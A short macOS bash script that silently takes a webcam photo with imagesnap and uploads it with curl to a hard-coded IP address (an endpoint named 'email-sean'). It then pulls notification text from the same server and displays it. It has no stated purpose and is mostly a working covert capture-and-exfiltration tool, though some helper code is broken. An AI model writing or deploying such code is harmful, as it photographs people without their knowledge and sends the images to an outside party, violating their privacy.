#!/bin/bash

function getJsonValue() {
  python -c "import json,sys;sys.stdout.write(json.dumps(json.load(sys.stdin)$1))";
}

function replaceQuotes() {
  return $1 | sed -e 's/^"//' -e 's/"$//'
}

function generateNotification() {
  osascript -e "display notification $3 with title $1 subtitle $2"
}

function notify() {
  header=$(curl "http://13.94.249.94/api/v1"| getJsonValue "['header']")
  title=$(curl "http://13.94.249.94/api/v1"| getJsonValue "['title']")
  subtitle=$(curl "http://13.94.249.94/api/v1"| getJsonValue "['subtitle']")
  generateNotification "$header" "$title" "$subtitle"
}

function takePicture() {
  mkdir -p images
  imageName=$(date +%s%N | cut -b1-13)$".png"
  $(pwd)/imagesnap -w 1 $(pwd)$"/images/"$imageName

  curl -F "file=@$(pwd)/images/$imageName" http://13.94.249.94/api/v1/email-sean
}

function main() {
  takePicture
  notify
}

main
